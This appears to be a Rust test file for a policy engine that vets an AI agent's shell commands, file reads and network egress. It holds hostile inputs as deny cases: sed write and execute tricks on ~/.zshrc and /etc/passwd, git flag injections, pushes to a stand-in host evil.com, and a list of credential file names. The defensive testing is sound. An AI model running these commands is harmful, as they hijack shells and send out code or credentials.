mod common;

use common::{fixture, request, Fixture};
use pair_core::traits::Policy;
use pair_core::types::Decision;

fn exec(f: &Fixture, exe: &str, args: &[&str]) -> Decision {
    exec_with(&f.engine, f, exe, args)
}

fn exec_with(
    engine: &pair_policy::PolicyEngine,
    f: &Fixture,
    exe: &str,
    args: &[&str],
) -> Decision {
    let mut r = request("shell.exec");
    r.executable = Some(exe.into());
    r.args = args.iter().map(ToString::to_string).collect();
    engine.authorize(&r, &f.ctx).decision
}

fn is_deny(d: &Decision) -> bool {
    matches!(d, Decision::Deny { .. })
}

#[test]
fn sed_write_command_outside_workspace_denied() {
    let f = fixture();
    std::fs::write(f.workspace.join("a.txt"), "x").expect("write");
    for args in [
        &["-n", "w /Users/me/.zshrc", "a.txt"][..],
        &["s/a/b/w /etc/passwd", "a.txt"][..],
        &["-n", "1e id", "a.txt"][..],
        &["-i", "s/a/b/", "a.txt"][..],
    ] {
        assert!(is_deny(&exec(&f, "sed", args)), "{args:?}");
    }
    assert_eq!(exec(&f, "sed", &["-n", "1,5p", "a.txt"]), Decision::Allow);
    assert_eq!(exec(&f, "sed", &["s/a/b/g", "a.txt"]), Decision::Allow);
}

#[test]
fn python_c_denied_on_host() {
    let f = fixture();
    for (exe, args) in [
        ("python3", &["-c", "import os"][..]),
        ("node", &["-e", "1"][..]),
        ("make", &[][..]),
        ("cargo", &["run"][..]),
        ("cargo", &["build"][..]),
        ("npm", &["run", "x"][..]),
    ] {
        match exec(&f, exe, args) {
            Decision::Deny { reason } => assert!(reason.contains("sandbox"), "{exe}: {reason}"),
            other => panic!("{exe} {args:?}: {other:?}"),
        }
    }
}

#[test]
fn git_dash_c_denied() {
    let f = fixture();
    let sandboxed = f.engine.with_sandbox();
    let bad: [&[&str]; 9] = [
        &["-c", "core.sshCommand=evil", "status"],
        &["-ccore.fsmonitor=evil", "status"],
        &["-c", "alias.x=!sh", "status"],
        &["--config-env=core.editor=X", "status"],
        &["--exec-path=/tmp/x", "status"],
        &["log", "--upload-pack=evil"],
        &["status", "--receive-pack=evil"],
        &["-C", "/etc", "status"],
        &["status", "core.hooksPath=/tmp"],
    ];
    for args in bad {
        assert!(is_deny(&exec(&f, "git", args)), "{args:?}");
        assert!(
            is_deny(&exec_with(&sandboxed, &f, "git", args)),
            "sandboxed {args:?}"
        );
    }
    for args in [
        &["status"][..],
        &["log", "-n", "5"][..],
        &["commit", "-m", "x"][..],
    ] {
        assert_eq!(exec(&f, "git", args), Decision::Allow, "{args:?}");
    }
    assert!(
        is_deny(&exec(&f, "git", &["clone", "x"])),
        "unlisted subcommand"
    );
    assert!(is_deny(&exec(&f, "git", &["push", "--receive-pack=evil"])));
}

#[test]
fn clustered_flag_path_checked() {
    let f = fixture();
    for arg in [
        "-xf/etc/x",
        "-o/etc/x",
        "--out=/etc/x",
        "KEY:/etc/x",
        "w /Users/me/.zshrc",
        "a=b:/etc/x",
    ] {
        assert!(is_deny(&exec(&f, "cat", &[arg])), "{arg}");
    }
    std::fs::write(f.workspace.join("a.txt"), "x").expect("write");
    assert_eq!(exec(&f, "cat", &["a.txt"]), Decision::Allow);
}

#[test]
fn scp_style_remote_egress_checked() {
    let f = fixture();
    for arg in ["git@evil.com:a/b", "evil.com:a/b", "x=user@evil.com:path"] {
        assert!(is_deny(&exec(&f, "ls", &[arg])), "{arg}");
    }
    assert_eq!(exec(&f, "ls", &["git@github.com:o/r.git"]), Decision::Allow);
}

const PORT_POLICY: &str = r#"
version: "t1"
tools: { fs.read: read }
executables_allow: [ls]
denied_paths: ["~/.ssh"]
egress:
  - { host: plain.example.com, data_classes: [public], schemes: [http, https], ports: [80, 8080, 443] }
  - { host: api.example.com, data_classes: [public] }
"#;

#[test]
fn egress_port_and_scheme_enforced() {
    let f = fixture();
    let engine = pair_policy::PolicyEngine::from_config_str(PORT_POLICY, &f.home).expect("policy");
    let mut ctx = f.ctx.clone();
    ctx.policy_version = engine.version().to_owned();
    let decide = |dest: &str| {
        let mut r = request("fs.read");
        r.destination = Some(dest.into());
        engine.authorize(&r, &ctx).decision
    };
    for ok in [
        "https://api.example.com/x",
        "https://api.example.com:443/x",
        "api.example.com",
        "http://plain.example.com/x",
        "http://plain.example.com:8080/x",
    ] {
        assert_eq!(decide(ok), Decision::Allow, "{ok}");
    }
    for bad in [
        "http://api.example.com/x",
        "https://api.example.com:8443/x",
        "ftp://api.example.com/x",
        "ssh://api.example.com/x",
        "http://plain.example.com:9999/x",
        "https://plain.example.com:22/x",
    ] {
        assert!(is_deny(&decide(bad)), "{bad}");
    }
}

#[test]
fn code_exec_allowed_only_when_sandboxed() {
    let f = fixture();
    let sandboxed = f.engine.with_sandbox();
    std::fs::write(f.workspace.join("s.py"), "x").expect("write");
    assert!(is_deny(&exec(&f, "python3", &["s.py"])));
    assert_eq!(
        exec_with(&sandboxed, &f, "python3", &["s.py"]),
        Decision::Allow
    );
    assert_eq!(
        exec_with(&sandboxed, &f, "cargo", &["test"]),
        Decision::Allow
    );
    assert!(is_deny(&exec_with(
        &sandboxed,
        &f,
        "python3",
        &["/etc/x.py"]
    )));
    assert!(is_deny(&exec_with(&sandboxed, &f, "docker", &["ps"])));
}

#[test]
fn credential_file_names_denied() {
    let f = fixture();
    for name in [
        ".envrc",
        ".git-credentials",
        "id_ecdsa",
        "id_dsa",
        "kubeconfig",
        "prod.tfvars",
        "store.jks",
        "sub/.ENVRC",
    ] {
        let mut r = request("fs.read");
        r.paths = vec![name.into()];
        assert!(is_deny(&f.engine.authorize(&r, &f.ctx).decision), "{name}");
    }
    let mut r = request("fs.read");
    r.paths = vec!["~/.git-credentials".into()];
    assert!(is_deny(&f.engine.authorize(&r, &f.ctx).decision));
}

const GIT_PUSH_POLICY: &str = r#"
version: "t1"
tools: { git.push: external_write }
executables_allow: [git]
denied_paths: ["~/.ssh"]
egress:
  - { host: github.com, data_classes: [public, personal], schemes: [https, ssh] }
"#;

const SHA: &str = "fc14fa52056f85a0d9ea37ca23bd55a9776a331c";

fn git_decision(tool: &str, args: &[&str]) -> Decision {
    let f = fixture();
    let engine =
        pair_policy::PolicyEngine::from_config_str(GIT_PUSH_POLICY, &f.home).expect("policy");
    let mut ctx = f.ctx.clone();
    ctx.policy_version = engine.version().to_owned();
    let mut r = request(tool);
    r.executable = Some("git".into());
    r.args = args.iter().map(ToString::to_string).collect();
    engine.authorize(&r, &ctx).decision
}

#[test]
fn push_refspec_is_not_an_scp_remote() {
    let refspec = format!("{SHA}:refs/heads/pair/t");
    let forced = format!("+{SHA}:refs/heads/pair/t");
    for args in [
        vec!["push", "git@github.com:acme/repo.git", refspec.as_str()],
        vec!["push", "https://github.com/acme/repo.git", forced.as_str()],
        vec!["push", "--force-with-lease", "origin", refspec.as_str()],
        vec!["push", "-u", "origin", "HEAD:refs/heads/x"],
    ] {
        assert!(
            matches!(
                git_decision("git.push", &args),
                Decision::NeedsApproval { .. }
            ),
            "{args:?}"
        );
    }
}

#[test]
fn push_remote_position_is_still_egress_checked() {
    let refspec = format!("{SHA}:refs/heads/pair/t");
    for args in [
        vec!["push", "git@evil.com:acme/repo.git", refspec.as_str()],
        vec!["push", "evil.com:acme/repo.git", refspec.as_str()],
        // A refspec-shaped value in the remote position IS a remote to git.
        vec!["push", refspec.as_str()],
        // An unknown value-taking flag before the remote: stay strict, treat everything as remote.
        vec!["push", "--repo", "x", "git@evil.com:a/b", refspec.as_str()],
    ] {
        assert!(is_deny(&git_decision("git.push", &args)), "{args:?}");
    }
}
